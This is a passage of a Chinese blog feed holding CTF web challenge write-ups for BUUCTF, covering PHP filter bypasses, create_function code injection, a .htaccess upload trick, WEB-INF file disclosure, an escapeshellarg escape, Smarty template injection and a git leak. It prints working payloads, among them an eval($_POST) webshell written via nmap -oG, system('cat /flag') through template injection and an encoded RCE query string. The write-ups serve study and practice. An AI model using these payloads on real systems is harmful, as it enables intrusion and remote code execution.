<span class="hljs-keyword">else</span> <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! What do you want to do ?!&#x27;</span>);<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_REQUEST</span>) &#123; <br>    <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_REQUEST</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$value</span>) &#123; <br>        <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))  <br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;fxck you! I hate English!&#x27;</span>); <br>    &#125; <br>&#125; <br><br><span class="hljs-keyword">if</span> (file_get_contents(<span class="hljs-variable">$file</span>) !== <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Aqua is the cutest five-year-old child in the world! Isn&#x27;t it ?&lt;br&gt;&quot;</span>);<br><br><br><span class="hljs-keyword">if</span> ( sha1(<span class="hljs-variable">$shana</span>) === sha1(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )&#123;<br>    extract(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;flag&quot;</span>]);<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Very good! you know my password. But what is flag?&lt;br&gt;&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;fxck you! you don&#x27;t know my password! And you don&#x27;t know sha1! why you come here!&quot;</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>) || <br>preg_match(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="hljs-variable">$arg</span>) ) &#123; <br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;br /&gt;Neeeeee~! I have disabled all dangerous functions! You can&#x27;t get my flag =w=&quot;</span>); <br>&#125; <span class="hljs-keyword">else</span> &#123; <br>    <span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<br>    <span class="hljs-variable">$code</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>); <br>&#125; <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>呃呃呃 一眼知识点杂糅</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"> <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/shana|debu|aqua|cute|arg|code|flag|system|exec|passwd|ass|eval|sort|shell|ob|start|mail|\$|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|read|inc|info|bin|hex|oct|echo|print|pi|\.|\&quot;|\&#x27;|log/i&#x27;</span>, <span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;QUERY_STRING&#x27;</span>])<br>    ...<br>    <span class="hljs-keyword">if</span> (!preg_match(<span class="hljs-string">&#x27;/http|https/i&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]))<br>    <span class="hljs-keyword">if</span> (preg_match(<span class="hljs-string">&#x27;/^aqua_is_cute$/&#x27;</span>, <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>]) &amp;&amp; <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;debu&#x27;</span>] !== <span class="hljs-string">&#x27;aqua_is_cute&#x27;</span>)<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/[a-zA-Z]/i&#x27;</span>, <span class="hljs-variable">$value</span>))  <span class="hljs-variable">$REQUEST</span><br>    <span class="hljs-keyword">if</span> (file_get_contents(<span class="hljs-variable">$file</span>) == <span class="hljs-string">&#x27;debu_debu_aqua&#x27;</span>)<br>    <span class="hljs-keyword">if</span> ( sha1(<span class="hljs-variable">$shana</span>) === sha1(<span class="hljs-variable">$passwd</span>) &amp;&amp; <span class="hljs-variable">$shana</span> != <span class="hljs-variable">$passwd</span> )<br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^[a-z0-9]*$/isD&#x27;</span>, <span class="hljs-variable">$code</span>) || <br>preg_match(<span class="hljs-string">&#x27;/fil|cat|more|tail|tac|less|head|nl|tailf|ass|eval|sort|shell|ob|start|mail|\`|\&#123;|\%|x|\&amp;|\$|\*|\||\&lt;|\&quot;|\&#x27;|\=|\?|sou|show|cont|high|reverse|flip|rand|scan|chr|local|sess|id|source|arra|head|light|print|echo|read|inc|flag|1f|info|bin|hex|oct|pi|con|rot|input|\.|log|\^/i&#x27;</span>, <span class="hljs-variable">$arg</span>) )<br></code></pre></td></tr></table></figure><p>对于 $_SERVER[‘QUERY_STRING’] PHP并不会对其做解码处理，所以可以直接urlencode</p><p>然后是 第四行的if %0a绕过</p><p>第五行的 $REQUEST  由于之前接收的参数为<code>$_GET</code>，而这儿处理的<code>$_REQUEST</code>，所以我们只需要POST一些相同的参数，这是因为$REQUEST处理数据$_POST优先级更高</p><p>第六行 data伪协议</p><p>第七行哈希比较 直接数组</p><p>有</p><p><code>file=data://text/plain,debu_debu_aqua&amp;debu=aqua_is_cute%0a&amp;shana[]=1&amp;passwd[]=2</code> &#x3D;&gt;</p><p><code>file=%64%61%74%61%3a%2f%2f%74%65%78%74%2f%70%6c%61%69%6e%2c%64%65%62%75%5f%64%65%62%75%5f%61%71%75%61&amp;%64%65%62%75=%61%71%75%61%5f%69%73%5f%63%75%74%65%0A&amp;%73%68%61%6e%61[]=1&amp;%70%61%73%73%77%64[]=2</code></p><p>最后一个if判断  $code(‘’, $arg) 可以联想到 create_function 代码注入</p><p>eg:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$a</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;id&#x27;</span>];<br><span class="hljs-variable">$b</span>=<span class="hljs-string">&#x27;echo&#x27;</span>.<span class="hljs-variable">$a</span>.<span class="hljs-string">&quot;;&quot;</span>;<br><span class="hljs-variable">$f</span>=create_function(<span class="hljs-string">&#x27;$a&#x27;</span>,<span class="hljs-variable">$b</span>);  <span class="hljs-comment">/* 参数 &#x27;$a&#x27; $b 函数体</span><br><span class="hljs-comment">$f($a);</span><br><span class="hljs-comment">?&gt;</span><br><span class="hljs-comment">这个匿名函数相当于这样的创建函数过程:</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">function niming($a)&#123;  </span><br><span class="hljs-comment">       echo $id.&#x27;is&#x27;.$a;</span><br><span class="hljs-comment">&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">id=1;&#125;phpinfo();/*</span><br><span class="hljs-comment">可以看到phpinfo的信息；</span><br></code></pre></td></tr></table></figure><p> $code 和 $arg可控就可以rce了，对于他们的值我们可以在line 39 <code>extract($_GET[&quot;flag&quot;]);</code>  进行控制，它负责把从数组中将变量导入到当前的符号表</p><p>于是可以有   <code>flag[code]=&#125;a()//;&amp;flag[arg]=create_function</code> 这样匿名函数体变为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> </span>&#123;<br>    <br>&#125;<br>a();<span class="hljs-comment">//&#125;</span><br></code></pre></td></tr></table></figure><p>接下来 <code>flag[arg]=&#125;var_dump(get_defined_vars());//&amp;flag[code]=create_function</code> 尝试将因为包含flag.php而存在的变量输出出来</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>:?debu%<span class="hljs-number">3</span>Daqua_is_cute%<span class="hljs-number">0</span>A%<span class="hljs-number">26</span>file%<span class="hljs-number">3</span>Ddata%<span class="hljs-number">3</span>A%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>Ftext%<span class="hljs-number">2</span>Fplain%<span class="hljs-number">2</span>Cdebu_debu_aqua%<span class="hljs-number">26</span>shana%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>D<span class="hljs-number">1</span>%<span class="hljs-number">26</span>passwd%<span class="hljs-number">5</span>B%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>D<span class="hljs-number">2</span>%<span class="hljs-number">26</span>flag%<span class="hljs-number">5</span>Barg%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>D%<span class="hljs-number">7</span>Dvar_dump(get_defined_vars())%<span class="hljs-number">3</span>B%<span class="hljs-number">2</span>F%<span class="hljs-number">2</span>F%<span class="hljs-number">26</span>flag%<span class="hljs-number">5</span>Bcode%<span class="hljs-number">5</span>D%<span class="hljs-number">3</span>Dcreate_function<br><span class="hljs-attribute">POST</span>:debu=<span class="hljs-number">1</span>&amp;file=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201282116024.png" alt="image-20220128211648854"></p><p>  hhhhhh  麻了这题半天没出 换浏览器出了  真正的flag在 rea1f14g.php</p><p>然后用 require读取，不想写了</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">GET</span>:?%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>=%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>_is_%<span class="hljs-number">63</span>%<span class="hljs-number">75</span>%<span class="hljs-number">74</span>%<span class="hljs-number">65</span>%<span class="hljs-number">0</span>A&amp;file=data://text/plain,%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>_%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>%<span class="hljs-number">62</span>%<span class="hljs-number">75</span>_%<span class="hljs-number">61</span>%<span class="hljs-number">71</span>%<span class="hljs-number">75</span>%<span class="hljs-number">61</span>&amp;%<span class="hljs-number">73</span>%<span class="hljs-number">68</span>%<span class="hljs-number">61</span>%<span class="hljs-number">6</span>e%<span class="hljs-number">61</span>[]=<span class="hljs-number">1</span>&amp;%<span class="hljs-number">70</span>%<span class="hljs-number">61</span>%<span class="hljs-number">73</span>%<span class="hljs-number">73</span>%<span class="hljs-number">77</span>%<span class="hljs-number">64</span>[]=<span class="hljs-number">2</span>&amp;%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>[%<span class="hljs-number">61</span>%<span class="hljs-number">72</span>%<span class="hljs-number">67</span>]=;&#125;require(~(%<span class="hljs-number">8</span>f%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>f%c<span class="hljs-number">5</span>%d<span class="hljs-number">0</span>%d<span class="hljs-number">0</span>%<span class="hljs-number">99</span>%<span class="hljs-number">96</span>%<span class="hljs-number">93</span>%<span class="hljs-number">8</span>b%<span class="hljs-number">9</span>a%<span class="hljs-number">8</span>d%d<span class="hljs-number">0</span>%<span class="hljs-number">8</span>d%<span class="hljs-number">9</span>a%<span class="hljs-number">9</span>e%<span class="hljs-number">9</span>b%c<span class="hljs-number">2</span>%<span class="hljs-number">9</span>c%<span class="hljs-number">90</span>%<span class="hljs-number">91</span>%<span class="hljs-number">89</span>%<span class="hljs-number">9</span>a%<span class="hljs-number">8</span>d%<span class="hljs-number">8</span>b%d<span class="hljs-number">1</span>%<span class="hljs-number">9</span>d%<span class="hljs-number">9</span>e%<span class="hljs-number">8</span>c%<span class="hljs-number">9</span>a%c<span class="hljs-number">9</span>%cb%d<span class="hljs-number">2</span>%<span class="hljs-number">9</span>a%<span class="hljs-number">91</span>%<span class="hljs-number">9</span>c%<span class="hljs-number">90</span>%<span class="hljs-number">9</span>b%<span class="hljs-number">9</span>a%d<span class="hljs-number">0</span>%<span class="hljs-number">8</span>d%<span class="hljs-number">9</span>a%<span class="hljs-number">8</span>c%<span class="hljs-number">90</span>%<span class="hljs-number">8</span>a%<span class="hljs-number">8</span>d%<span class="hljs-number">9</span>c%<span class="hljs-number">9</span>a%c<span class="hljs-number">2</span>%<span class="hljs-number">8</span>d%<span class="hljs-number">9</span>a%<span class="hljs-number">9</span>e%ce%<span class="hljs-number">99</span>%<span class="hljs-number">93</span>%cb%<span class="hljs-number">98</span>%d<span class="hljs-number">1</span>%<span class="hljs-number">8</span>f%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>f));//&amp;%<span class="hljs-number">66</span>%<span class="hljs-number">6</span>c%<span class="hljs-number">61</span>%<span class="hljs-number">67</span>[%<span class="hljs-number">63</span>%<span class="hljs-number">6</span>f%<span class="hljs-number">64</span>%<span class="hljs-number">65</span>]=create_function<br><span class="hljs-attribute">POST</span>:debu=<span class="hljs-number">1</span>&amp;file=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://d3n13d.github.io/categories/CTF/"/>
    
    
    <category term="Web" scheme="https://d3n13d.github.io/tags/Web/"/>
    
  </entry>
  
  <entry>
    <title>BUUCTF_web_第二页wp分享</title>
    <link href="https://d3n13d.github.io/2022/01/18/BUUCTF-web-%E7%AC%AC%E4%BA%8C%E9%A1%B5wp%E5%88%86%E4%BA%AB/"/>
    <id>https://d3n13d.github.io/2022/01/18/BUUCTF-web-%E7%AC%AC%E4%BA%8C%E9%A1%B5wp%E5%88%86%E4%BA%AB/</id>
    <published>2022-01-18T15:16:02.000Z</published>
    <updated>2022-01-28T14:12:33.518Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="GXYCTF2019-BabyUpload"><a href="#GXYCTF2019-BabyUpload" class="headerlink" title="[GXYCTF2019]BabyUpload"></a>[GXYCTF2019]BabyUpload</h2><p>上传 .htaccess ，同时修改content-type 为 image&#x2F;jpeg</p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121403584.png" alt="image-20220112140343471"></p><p>&#x2F;upload&#x2F;b323290d2841ae288bfa9e1f60656229&#x2F;.htaccess </p><p>最后构建数据包如下</p><figure class="highlight http"><table><tr><td class="gutter"><div class="code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>8a151de1-b4cf-42d2-8790-f818712a24fa.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>340<br><span class="hljs-attribute">Cache-Control</span><span class="hljs-punctuation">: </span>max-age=0<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>http://8a151de1-b4cf-42d2-8790-f818712a24fa.node4.buuoj.cn:81<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>multipart/form-data; boundary=----WebKitFormBoundaryFifAOyg5pajYHOAX<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36 Edg/96.0.1054.29<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://8a151de1-b4cf-42d2-8790-f818712a24fa.node4.buuoj.cn:81/<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>UM_distinctid=17ce3948a50a00-06fd4863146224-561a135a-144000-17ce3948a51bb6; PHPSESSID=a1410921a9c32d5b11729089df57ddda<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><br><span class="pgsql"><span class="hljs-comment">------WebKitFormBoundaryFifAOyg5pajYHOAX</span></span><br><span class="pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;uploaded&quot;; filename=&quot;b.jpg&quot;</span><br><span class="pgsql">Content-<span class="hljs-keyword">Type</span>: image/jpeg</span><br><span class="pgsql"></span><br><span class="pgsql">GIF89a</span><br><span class="pgsql">&lt;script <span class="hljs-keyword">language</span>=<span class="hljs-string">&#x27;php&#x27;</span>&gt;readfile(<span class="hljs-string">&#x27;/flag&#x27;</span>);&lt;/script&gt;</span><br><span class="pgsql"><span class="hljs-comment">------WebKitFormBoundaryFifAOyg5pajYHOAX</span></span><br><span class="pgsql">Content-Disposition: form-data; <span class="hljs-type">name</span>=&quot;submit&quot;</span><br><span class="pgsql"></span><br><span class="pgsql">涓婁紶</span><br><span class="pgsql"><span class="hljs-comment">------WebKitFormBoundaryFifAOyg5pajYHOAX--</span></span><br></code></pre></td></tr></table></figure><p>该说不说 readfile函数真好用</p><h2 id="RoarCTF-2019-Easy-Java"><a href="#RoarCTF-2019-Easy-Java" class="headerlink" title="[RoarCTF 2019]Easy Java"></a>[RoarCTF 2019]Easy Java</h2><p>目前做Java的题目也不不多</p><p>想到了 <code>WEB-INF/web.xml</code> 这个文件</p><p>使用如下方式访问并下载 <code>WEB-INF/web.xml</code></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">POST</span> /Download?filename=WEB-INF/web.xml HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span><br><span class="hljs-attribute">Host</span>: <span class="hljs-number">470</span>bc<span class="hljs-number">6</span>ee-f<span class="hljs-number">24</span>b-<span class="hljs-number">46</span>f<span class="hljs-number">4</span>-<span class="hljs-number">8</span>b<span class="hljs-number">2</span>c-<span class="hljs-number">652724</span>aa<span class="hljs-number">6</span>dd<span class="hljs-number">8</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span><br><span class="hljs-attribute">Cache</span>-Control: max-age=<span class="hljs-number">0</span><br><span class="hljs-attribute">Upgrade</span>-Insecure-Requests: <span class="hljs-number">1</span><br><span class="hljs-attribute">User</span>-Agent: Mozilla/<span class="hljs-number">5</span>.<span class="hljs-number">0</span> (Windows NT <span class="hljs-number">10</span>.<span class="hljs-number">0</span>; Win<span class="hljs-number">64</span>; x<span class="hljs-number">64</span>) AppleWebKit/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> (KHTML, like Gecko) Chrome/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">4664</span>.<span class="hljs-number">45</span> Safari/<span class="hljs-number">537</span>.<span class="hljs-number">36</span> Edg/<span class="hljs-number">96</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1054</span>.<span class="hljs-number">29</span><br><span class="hljs-attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,image/webp,image/apng,*/*;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,application/signed-exchange;v=b<span class="hljs-number">3</span>;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span><br><span class="hljs-attribute">Referer</span>: http://<span class="hljs-number">470</span>bc<span class="hljs-number">6</span>ee-f<span class="hljs-number">24</span>b-<span class="hljs-number">46</span>f<span class="hljs-number">4</span>-<span class="hljs-number">8</span>b<span class="hljs-number">2</span>c-<span class="hljs-number">652724</span>aa<span class="hljs-number">6</span>dd<span class="hljs-number">8</span>.node<span class="hljs-number">4</span>.buuoj.cn:<span class="hljs-number">81</span>/Login<br><span class="hljs-attribute">Accept</span>-Encoding: gzip, deflate<br><span class="hljs-attribute">Accept</span>-Language: zh-CN,zh;q=<span class="hljs-number">0</span>.<span class="hljs-number">9</span>,en;q=<span class="hljs-number">0</span>.<span class="hljs-number">8</span>,en-GB;q=<span class="hljs-number">0</span>.<span class="hljs-number">7</span>,en-US;q=<span class="hljs-number">0</span>.<span class="hljs-number">6</span><br><span class="hljs-attribute">Cookie</span>: UM_distinctid=<span class="hljs-number">17</span>ce<span class="hljs-number">3948</span>a<span class="hljs-number">50</span>a<span class="hljs-number">00</span>-<span class="hljs-number">06</span>fd<span class="hljs-number">4863146224</span>-<span class="hljs-number">561</span>a<span class="hljs-number">135</span>a-<span class="hljs-number">144000</span>-<span class="hljs-number">17</span>ce<span class="hljs-number">3948</span>a<span class="hljs-number">51</span>bb<span class="hljs-number">6</span>; JSESSIONID=<span class="hljs-number">182341</span>C<span class="hljs-number">534</span>F<span class="hljs-number">75</span>A<span class="hljs-number">7</span>F<span class="hljs-number">4</span>BA<span class="hljs-number">550740</span>A<span class="hljs-number">94645</span>E<br><span class="hljs-attribute">Connection</span>: close<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121416763.png" alt="image-20220112141624678"></p><p>这个大佬写的知识点很不错 <a href="https://blog.csdn.net/ChenZIDu/article/details/103533554">https://blog.csdn.net/ChenZIDu/article/details/103533554</a></p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs gradle">WEB-INF主要包含一下文件或目录:<br><span class="hljs-regexp">/WEB-INF/</span>web.xml：Web应用程序配置文件，描述了 servlet 和其他的应用组件配置及命名规则。<br><span class="hljs-regexp">/WEB-INF/</span>classes/：含了站点所有用的 <span class="hljs-keyword">class</span> 文件，包括 servlet <span class="hljs-keyword">class</span> 和非servlet <span class="hljs-keyword">class</span>，他们不能包含在 .jar文件中<br><span class="hljs-regexp">/WEB-INF/</span>lib/：存放web应用需要的各种JAR文件，放置仅在这个应用中要求使用的jar文件,如数据库驱动jar文件<br><span class="hljs-regexp">/WEB-INF/</span>src/：源码目录，按照包名结构放置各个java文件。<br><span class="hljs-regexp">/WEB-INF/</span>database.properties：数据库配置文件<br>漏洞检测以及利用方法：通过找到web.xml文件，推断<span class="hljs-keyword">class</span>文件的路径，最后直接<span class="hljs-keyword">class</span>文件，在通过反编译<span class="hljs-keyword">class</span>文件，得到网站源码<br><br></code></pre></td></tr></table></figure><p>于是构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs url">?filename=WEB-INF/classes/com/wm/ctf/FlagController.class<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121420185.png" alt="image-20220112142047070"></p><h2 id="BUUCTF-2018-Online-Tool"><a href="#BUUCTF-2018-Online-Tool" class="headerlink" title="[BUUCTF 2018]Online Tool"></a>[BUUCTF 2018]Online Tool</h2><p>经典例题</p><p>原理讲解：<a href="https://paper.seebug.org/164/">https://paper.seebug.org/164/</a></p><blockquote><ol><li>传入的参数是：<code>172.17.0.2&#39; -v -d a=1</code></li><li>经过<code>escapeshellarg</code>处理后变成了<code>&#39;172.17.0.2&#39;\&#39;&#39; -v -d a=1&#39;</code>，即先对单引号转义，再用单引号将左右两部分括起来从而起到连接的作用。</li><li>经过<code>escapeshellcmd</code>处理后变成<code>&#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，这是因为<code>escapeshellcmd</code>对<code>\</code>以及最后那个<strong>不配对儿</strong>的引号进行了转义：<a href="http://php.net/manual/zh/function.escapeshellcmd.php">http://php.net/manual/zh/function.escapeshellcmd.php</a></li><li>最后执行的命令是<code>curl &#39;172.17.0.2&#39;\\&#39;&#39; -v -d a=1\&#39;</code>，由于中间的<code>\\</code>被解释为<code>\</code>而不再是转义字符，所以后面的<code>&#39;</code>没有被转义，与再后面的<code>&#39;</code>配对儿成了一个空白连接符。所以可以简化为<code>curl 172.17.0.2\ -v -d a=1&#39;</code>，即向<code>172.17.0.2\</code>发起请求，POST 数据为<code>a=1&#39;</code></li></ol></blockquote><p>大致就是 escapeshellarg() escapeshellcmd()一起使用导致了引号的逃逸（也不算是），使用namp的oG参数将结果输出到1.php</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">?host=&#x27; &lt;?php @eval($_POST[1]);?&gt; -oG 1.php &#x27;<br></code></pre></td></tr></table></figure><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121431342.png" alt="image-20220112143117237"></p><p>如此得到flag</p><h2 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h2><p>秒了…</p><p>在hints.php处发现提示</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-comment">&lt;!-- Do you know why i know your ip? --&gt;</span><br></code></pre></td></tr></table></figure><p>推断是XFF哪里有动作，一开始以为是sql注入(脑子进水想法)，然后试了试SSTi</p><p>尝试构造</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs http">X-Forwarded-For:&#123;&#123;1*7&#125;&#125;    得到 7<br></code></pre></td></tr></table></figure><p>一开始以为是Jinja，然后拿手里的payload试了试 发现是Smarty</p><p><code>X-Forwarded-For:&#123;if phpinfo()&#125;&#123;/if&#125;</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121701751.png" alt="image-20220112170118419"><br><code>X-Forwarded-For:&#123;if system(&#39;cat /flag&#39;)&#125;&#123;/if&#125;</code></p><p><img src="https://photo-1308752946.cos.ap-beijing.myqcloud.com/img/Typora/202201121702617.png" alt="image-20220112170207322"></p><h2 id="GXYCTF2019-禁止套娃"><a href="#GXYCTF2019-禁止套娃" class="headerlink" title="[GXYCTF2019]禁止套娃"></a>[GXYCTF2019]禁止套娃</h2><p>这题找了半天线索没找到，还剩 git svn没看，发现存在git泄露</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python2 GitHack.py http://5cb252e7-7d0a-4189-9441-061660212513.node4.buuoj.cn:81/.git/xxxxxxxxxx1 1python Gitpython2 GitHack.py http://5cb252e7-7d0a-4189-9441-061660212513.node4.buuoj.cn:81/.git/<br></code></pre></td></tr></table></figure><p>得到源码  index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 